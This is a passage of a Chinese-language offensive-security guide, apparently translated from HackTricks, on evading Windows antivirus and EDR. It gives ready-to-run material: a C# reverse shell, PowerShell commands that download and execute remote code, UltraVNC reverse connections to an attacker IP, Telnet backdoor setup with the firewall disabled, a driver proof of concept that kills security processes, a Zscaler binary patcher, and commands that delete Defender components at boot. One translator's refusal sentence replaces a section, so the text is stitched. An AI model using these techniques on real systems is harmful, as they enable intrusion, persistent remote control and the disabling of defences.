这属于规避内存扫描，而非加密保护：修补后的文件仍包含原始的明文函数体，并且调试器可以在 `VirtualProtect` 或 XOR 循环处设置断点，转储当前处于活动状态的函数。单字节 XOR、可读的元数据以及固定的 `0x46` 边界也使离线恢复变得容易。<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> PoC 使用的 TEB 槽是线程本地的，但修改后的代码页是进程级共享的。因此，并发或递归进入可能会在另一个调用正在执行时再次切换指令；异常和非本地退出也可能绕过重新掩蔽。健壮的实现必须同步状态切换，恢复通过 `lpflOldProtect` 返回的实际保护属性，避免硬编码 stub 长度，审查所有 `call` 和 `jmp` 路径是否满足 x64 栈对齐要求，并在重写可执行字节后调用 `FlushInstructionCache`。Microsoft 明确规定，修改可执行代码时，调用方有责任确保指令缓存一致性。<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen 与 MoTW

你可能在从互联网下载并运行某些可执行文件时见过这个屏幕。

Microsoft Defender SmartScreen 是一种安全机制，旨在保护最终用户，避免其运行可能带有恶意的应用程序。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen 主要采用基于信誉的方式运行，也就是说，不常见的下载应用程序会触发 SmartScreen，从而向最终用户发出警告并阻止其运行文件（不过，点击“更多信息” ->“仍要运行”仍可以运行该文件）。

**MoTW**（Mark of The Web）是一种名为 Zone.Identifier 的 [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)，它会在从互联网下载文件时自动创建，并记录文件的下载来源 URL。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>检查从互联网下载的文件的 Zone.Identifier ADS。</p></figcaption></figure>

> [!TIP]
> 请注意，使用**受信任**的签名证书签名的可执行文件**不会触发 SmartScreen**。

防止 payload 被添加 Mark of The Web 的一种非常有效的方法，是将其打包到 ISO 之类的容器中。这是因为 Mark-of-the-Web (MOTW)**无法**应用于**非 NTFS** 卷。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) 是一款将 payload 打包到输出容器中的工具，可用于规避 Mark-of-the-Web。

示例用法：

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

这是一个演示，展示如何使用 [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) 将 payload 打包到 ISO 文件中以绕过 SmartScreen。

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) 是 Windows 中强大的日志记录机制，允许应用程序和系统组件**记录事件**。不过，安全产品也可以利用它来监控和检测恶意活动。

与禁用（绕过）AMSI 类似，也可以让用户空间进程中的 **`EtwEventWrite`** 函数立即返回，而不记录任何事件。具体做法是在内存中 patch 该函数，使其立即返回，从而有效禁用该进程的 ETW 日志记录。

更多信息请参阅 **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) 和 [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**。<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

在内存中加载 C# 二进制文件已有相当长的历史，而且至今仍是运行 post-exploitation 工具而不被 AV 发现的绝佳方式。

由于 payload 会直接加载到内存中，不会接触磁盘，因此我们只需要考虑在整个进程中 patch AMSI。

大多数 C2 框架（sliver、Covenant、metasploit、CobaltStrike、Havoc 等）都已支持直接在内存中执行 C# 程序集，但实现方式有多种：

- **Fork\&Run**

这种方式会**生成一个新的牺牲进程**，将 post-exploitation 恶意代码注入该进程并执行，完成后再终止这个新进程。它有利有弊。Fork and run 方法的好处是，执行发生在 Beacon implant 进程**之外**。这意味着，如果 post-exploitation 操作中出现问题或被发现，我们的 **implant 存活下来的可能性要大得多**。缺点是被**行为检测**发现的可能性更高。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

这种方式是将 post-exploitation 恶意代码注入**自身进程**。这样可以避免创建新进程并被 AV 扫描，但缺点是，如果 payload 执行出错，**丢失 beacon 的可能性要大得多**，因为进程可能会崩溃。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 如果想了解更多关于加载 C# Assembly 的内容，请阅读这篇文章 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) 以及他们的 InlineExecute-Assembly BOF（[https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)）。

你也可以**从 PowerShell 加载 C# Assembly**，请查看 [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) 和 [S3cur3th1sSh1t 的视频](https://www.youtube.com/watch?v=oe11Q-3Akuk)。

## 使用其他编程语言

正如 [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) 中提出的，可以让受感染的机器访问**攻击者控制的 SMB 共享上安装的解释器环境**，从而使用其他语言执行恶意代码。

通过允许访问 SMB 共享上的解释器二进制文件和环境，你可以在受感染机器的内存中**使用这些语言执行任意代码**。

该仓库指出：Defender 仍会扫描脚本，但利用 Go、Java、PHP 等语言，我们可以**更灵活地绕过静态特征**。使用这些语言编写随机且未混淆的反向 shell 脚本进行测试，结果证明是有效的。

## TokenStomping

Token stomping 会操纵安全产品（例如 EDR 或 AV）的访问令牌。降低令牌权限可以让进程继续运行，同时阻止它执行特权检查或修复操作。

为防止这种情况，Windows 可以**阻止外部进程**获取安全进程令牌的句柄。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## 使用可信软件

### Chrome Remote Desktop

如[**这篇博客文章**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)所述，只需在受害者的 PC 上部署 Chrome Remote Desktop，然后利用它接管设备并维持持久性，就很容易实现：<sup>[[35]](#references)</sup>
1. 从 https://remotedesktop.google.com/ 下载，点击“Set up via SSH”，然后点击 Windows 的 MSI 文件进行下载。
2. 在受害者的设备上静默运行安装程序（需要管理员权限）：`msiexec /i chromeremotedesktophost.msi /qn`
3. 返回 Chrome Remote Desktop 页面并点击下一步。向导随后会要求你授权；点击 Authorize 按钮继续。
4. 执行提供的命令，并按需进行调整：`"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111`（`--pin` 参数可在不使用 GUI 的情况下设置 PIN）。
 

## 高级规避

规避是一个非常复杂的主题，有时你必须考虑单个系统中许多不同的遥测来源，因此在成熟的环境中，想要完全不被发现几乎是不可能的。

你所面对的每个环境都有各自的优势和弱点。

我强烈建议你观看 [@ATTL4S](https://twitter.com/DaniLJ94) 的这场演讲，以初步了解更多高级规避技术。


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

这也是 [@mariuszbit](https://twitter.com/mariuszbit) 关于纵深规避的另一场精彩演讲。


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **旧技术**

### **检查 Defender 判定为恶意的部分**

你可以使用 [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)，它会**逐步移除二进制文件的部分内容**，直到**找出 Defender 判定为恶意的部分**，并将其拆分出来。\
另一个实现**相同功能的工具是** [**avred**](https://github.com/dobin/avred)，它提供了一个开放的 Web 服务：[**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

在 Windows10 之前，所有 Windows 系统都自带一个**Telnet server**，你可以通过以下方式安装（需要管理员权限）:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

让它在系统启动时**启动**，并立即**运行**它：

```bash
sc config TlntSVR start= auto obj= localsystem
```

**更改 telnet 端口**（隐蔽）并禁用防火墙：

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

从这里下载：[http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html)（需要下载 bin 文件，而不是 setup）

**在主机上**：执行 _**winvnc.exe**_ 并配置服务器：

- 启用 _Disable TrayIcon_ 选项
- 在 _VNC Password_ 中设置密码
- 在 _View-Only Password_ 中设置密码

然后，将二进制文件 _**winvnc.exe**_ 和**新创建的**文件 _**UltraVNC.ini**_ 移到**受害者**主机中

#### **反向连接**

**攻击者**应在自己的**主机上**执行二进制文件 `vncviewer.exe -listen 5900`，以便**准备好**接收反向 **VNC 连接**。然后，在**受害者**主机中：启动 winvnc 守护进程 `winvnc.exe -run`，并运行 `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**警告：** 为了保持隐蔽，不要做以下几件事：

- 如果 `winvnc` 已经在运行，就不要再次启动，否则会触发一个[弹窗](https://i.imgur.com/1SROTTl.png)。使用 `tasklist | findstr winvnc` 检查它是否正在运行
- 如果同一目录中没有 `UltraVNC.ini`，就不要启动 `winvnc`，否则会打开[配置窗口](https://i.imgur.com/rfMQWcf.png)
- 不要运行 `winvnc -h` 查看帮助，否则会触发一个[弹窗](https://i.imgur.com/oc18wcu.png)

### GreatSCT

从这里下载：[https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

在 GreatSCT 中：

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

现在使用 `msfconsole -r file.rc` **启动监听器**，并**执行** **xml payload**：

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**当前的 Defender 会非常快地终止进程。**

### 编译我们自己的 reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 第一个 C# Revershell

使用以下命令编译：

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

与其配合使用：

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### 使用编译器的 C#

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自动下载并执行：

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# 混淆器列表：[https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### 使用 python 构建 injector 示例：

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### 其他工具

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### 更多

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## 自带易受攻击的驱动程序 (BYOVD) – 从内核空间终止 AV/EDR

Storm-2603 使用一款名为 **Antivirus Terminator** 的小型控制台工具，在部署勒索软件前禁用端点防护。该工具自带**易受攻击但*已签名*的驱动程序**，并利用它执行特权内核操作，甚至能绕过 Protected-Process-Light (PPL) AV 服务的拦截。<sup>[[12]](#references)</sup>

要点
1. **已签名的驱动程序**：写入磁盘的文件名为 `ServiceMouse.sys`，但该二进制文件实际上是 Antiy Labs“System In-Depth Analysis Toolkit”中的合法签名驱动程序 `AToolsKrnl64.sys`。由于该驱动程序带有有效的 Microsoft 签名，因此即使启用了 Driver-Signature-Enforcement (DSE)，它也能加载。
2. **服务安装**：
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   第一行将驱动程序注册为 **kernel service**，第二行启动它，使 `\\.\ServiceMouse` 可从用户态访问。
3. **驱动程序公开的 IOCTL**
   | IOCTL code | 功能                                      |
   |-----------:|-----------------------------------------|
   | `0x99000050` | 根据 PID 终止任意进程（用于结束 Defender/EDR 服务） |
   | `0x990000D0` | 删除磁盘上的任意文件 |
   | `0x990001D0` | 卸载驱动程序并移除服务 |

   最精简的 C 概念验证：
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **为何有效**：BYOVD 完全绕过用户模式防护；在内核中执行的代码可以打开*受保护的*进程、终止它们或篡改内核对象，不受 PPL/PP、ELAM 或其他强化功能的限制。

检测 / 缓解
•  启用 Microsoft 的易受攻击驱动程序阻止列表（`HVCI`、`Smart App Control`），使 Windows 拒绝加载 `AToolsKrnl64.sys`。
•  监控新建的*内核*服务；如果驱动程序从所有用户均可写的目录加载，或不在允许列表中，则发出警报。
•  监控用户模式句柄访问自定义设备对象后，是否出现可疑的 `DeviceIoControl` 调用。

### 通过磁盘二进制文件补丁绕过 Zscaler Client Connector 姿态检查

Zscaler 的 **Client Connector** 在本地应用设备姿态规则，并依赖 Windows RPC 将结果传递给其他组件。两个薄弱的设计选择使完全绕过成为可能：

1. 姿态评估**完全在客户端进行**（向服务器发送一个布尔值）。
2. 内部 RPC 端点只验证连接的可执行文件是否**由 Zscaler 签名**（通过 `WinVerifyTrust`）。<sup>[[11]](#references)</sup>

通过对**磁盘上的四个已签名二进制文件打补丁**，可以同时使这两种机制失效：

| 二进制文件 | 被修改的原始逻辑 | 结果 |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 始终返回 `1`，使每项检查都符合要求 |
| `ZSAService.exe` | 对 `WinVerifyTrust` 的间接调用 | 替换为 NOP ⇒ 任何进程（包括未签名进程）都可以绑定到 RPC 管道 |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | 替换为 `mov eax,1 ; ret` |
| `ZSATunnel.exe` | 隧道完整性检查 | 短路跳过 |

最简补丁程序摘录：

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

替换原始文件并重启服务堆栈后：

* **所有** posture checks 均显示为**绿色/合规**。
* 未签名或已修改的二进制文件可以打开指定的 named-pipe RPC 端点（例如 `\\RPC Control\\ZSATrayManager_talk_to_me`）。
* 被攻陷的主机可以不受限制地访问 Zscaler policies 定义的内部网络。

这个案例研究展示了，纯客户端的信任决策和简单的签名检查如何通过几处字节补丁被绕过。

## Microsoft Defender `BTR.sys` 可信功能滥用

Defender 的 **Boot-Time Removal** 驱动是对经典 BYOVD 的一个有用反例。`BTR.sys` 是 Microsoft 正式签名的修复组件，不存在内存损坏漏洞，也没有 IOCTL 接口；在获得管理员访问权限和 `SeLoadDriverPrivilege` 后，操作者可以伪造其私有修复事务，从而执行驱动本身预期的 Ring-0 文件/注册表操作。这是一种**入侵后的 AV/EDR 中和原语，而非初始访问或权限提升**；此外，可以从目标自身 `MpEngine.dll` 的 `BOOTTIMETOOL` 资源中提取该驱动，而不必导入显眼的第三方驱动。<sup>[[36]](#references)</sup>

### 暂存一次性驱动

Defender 通常会将该资源写入随机命名的 `[a-z]{8}.sys` 文件，并注册一个名称相似的内核服务。`DriverEntry` 会读取服务的 `Args` 值，打开引用的 NTFS ADS，解密并验证操作列表，写入反馈；成功执行后返回 `0xC0000056`（`STATUS_DELETE_PENDING`），使驱动卸载，而不是继续驻留。伪造的服务具有以下特征值。<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

`:changelist` 流包含一个经过 RC4 加密的 blob。经分析的版本会重复使用固定的 256 字节密钥，因此加密并非授权边界。有效明文包含一个 24 字节的全局头部（`Magic=0xFEE1DEAD`、`Version=2`、`PayloadOffset=0x10`、头部 CRC 和根据 payload 派生的 transaction ID），后跟以 null 结尾的 UTF-16 feedback 路径，以及任意数量的条目。每个条目都包含一个 16 字节的头部（`DataSize`、`Action`、`HeaderCRC`、`DataCRC`），后跟特定于操作的数据，并以**恰好四个 NUL 字节**结尾。每个头部/数据区域都会分别使用 CRC-32 多项式 `0xEDB88320`、初始状态 `0xFFFFFFFF` 和**不进行最终 XOR**（`~CRC32`）进行校验；每个区域都会重置 CRC 状态。<sup>[[36]](#references)[[37]](#references)</sup>

接受的操作 ID 暴露了这些内核原语。<sup>[[36]](#references)[[37]](#references)</sup>

| ID | 条目数据 | 结果 |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | 删除文件，包括被锁定的文件 |
| 2 | `[UTF-16 path]` | 删除空目录 |
| 3 | `[Flags][source][destination]` | 将文件移动到攻击者选定的受保护路径；目标为空表示删除 |
| 4 | `[Flags][key path]` | 递归删除注册表项 |
| 5 | `[Flags][key path + "\\" + value]` | 删除注册表值 |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | 创建/更新注册表值，并创建缺失的键路径 |

对于操作 5 和 6，线上格式中的键/值分隔符是**两个连续的反斜杠**；按常规格式书写的路径无法正确拆分。feedback 文件大体上会镜像请求，但每个条目的前四个数据字节会变成其结果 `NTSTATUS`。对于没有前置 flags 字段的操作 1 和 2，BTR 会将路径移入四个保留的尾随字节，为该状态腾出空间。<sup>[[36]](#references)</sup>

### `BTR_CLI` 工作流和早期启动窗口

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) 实现了完整链路：从本地 Defender 提取 `BTR.sys`，创建 `<random>.sys:changelist` 和一个 feedback 流，序列化、校验和并加密链式操作，直接创建服务注册表项，然后在 `-trigger now` 时调用 `NtLoadDriver`，或在 `-trigger boot` 时将其保留为系统启动驱动程序。直接暂存注册表可绕过常规 SCM `CreateServiceW` 路径，因此**不会**生成服务安装事件 ID 7045。之后可以使用 `BTR_CLI.exe -cleanup <service_name>` 删除由启动触发的相关文件。<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` 不可用，因为 BTR 会在存储堆栈和 `SystemRoot` 链接就绪前，从 `DriverEntry` 执行文件 I/O。`Start=1` 配合高优先级的 `Boot Bus Extender` 组，则会在 Phase 1 执行：此时 NTFS 已可用，但许多系统启动安全驱动和用户模式 EDR 服务尚未初始化。像 `WdFilter` 这样的启动筛选驱动可能已经加载，但 BTR 可以在下次启动前删除其二进制文件或服务配置，也可以在 SCM 启动服务可执行文件前将其删除。ELAM 无法弥补这个空档，因为 BTR 在启动驱动评估后运行，且带有有效的 Microsoft 签名。<sup>[[36]](#references)</sup>

多个操作会在一个事务中执行。PoC 会为硬编码路径 `\SystemRoot\Temp\BootClean.log` 前置 Action 1：BTR 创建此日志，然后执行自身的删除请求，并在卸载前将其删除。这会减少痕迹；而将反馈写入 `<random>.sys:<random>.dat`，则可以连同驱动和两个数据流一起删除。<sup>[[36]](#references)[[37]](#references)</sup>

### 高信号检测关联

仅基于签名的规则和 Microsoft 易受攻击驱动程序阻止列表，无法应对对 BTR 预期功能的滥用。建议优先使用以下行为关联，同时区分 Defender 的正常调用链与任意启动程序。<sup>[[36]](#references)</sup>

- **Sysmon 15：** `.sys:changelist` 的创建是 BTR 暂存操作的共同行为。若同一 `.sys` 附加了 `.dat` ADS，则尤其可疑，因为正常情况下 Defender 通常会将反馈文件放在 `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` 下。
- **没有 System 7045 的 Sysmon 12/13：** 关联直接创建的 `HKLM\SYSTEM\CurrentControlSet\Services\<random>`，其内容包含 `Args=...:changelist` 和 `Group=Boot Bus Extender`，且没有对应的 SCM 安装事件。
- **Sysmon 6 -> 23：** 关联非 Defender 调用链加载已知 BTR 驱动，随后由 `System`/PID 4 执行文件删除，尤其是删除安全软件二进制文件时。
- **Sysmon 11 -> 23：** 若 `System`/PID 4 快速创建并删除 `\SystemRoot\Temp\BootClean.log`，则触发警报。
- 限制并审计 `SeLoadDriverPrivilege` 的分配和启用；当安全工具驱动由 `cmd.exe`、PowerShell 或未知进程暂存时，仅有 Microsoft 签名不足以建立信任。

## 利用 Protected Process Light (PPL) 和 LOLBINs 篡改 AV/EDR

Protected Process Light (PPL) 通过签名者/级别层级实施保护，只有保护级别相同或更高的进程才能相互篡改。从攻击角度看，如果你能合法启动启用了 PPL 的二进制文件，并控制其参数，就可以将良性功能（例如日志记录）转化为受限的、由 PPL 支持的写入原语，用于操作 AV/EDR 使用的受保护目录。<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

使进程以 PPL 运行的条件
- 目标 EXE（以及任何已加载的 DLL）必须使用支持 PPL 的 EKU 签名。
- 必须使用以下标志调用 CreateProcess 来创建进程：`EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`。
- 必须请求与二进制文件签名者匹配的兼容保护级别（例如，反恶意软件签名者使用 `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`，Windows 签名者使用 `PROTECTION_LEVEL_WINDOWS`）。级别不匹配会导致创建失败。

另请参阅关于 PP/PPL 和 LSASS 保护的更全面介绍：

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

启动器工具
- 开源辅助工具：CreateProcessAsPPL（选择保护级别并将参数转发给目标 EXE）：
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- 用法模式：

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

抱歉，我不能翻译这段利用 PPL 权限破坏 Defender 文件并通过开机服务实现持久化的操作说明。我可以协助将其改写为不含可执行步骤的安全风险摘要。

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

注意事项与限制
- 你无法控制 ClipUp 写入的内容，只能控制写入位置；此原语适用于破坏，而非精确注入内容。
- 需要本地管理员/SYSTEM 权限才能安装/启动服务，并且需要重启窗口。
- 时机至关重要：目标文件不能处于打开状态；在启动时执行可避免文件锁定。

检测
- 在启动前后，检查是否有带异常参数的 `ClipUp.exe` 进程，尤其是由非标准启动器作为父进程启动的情况。
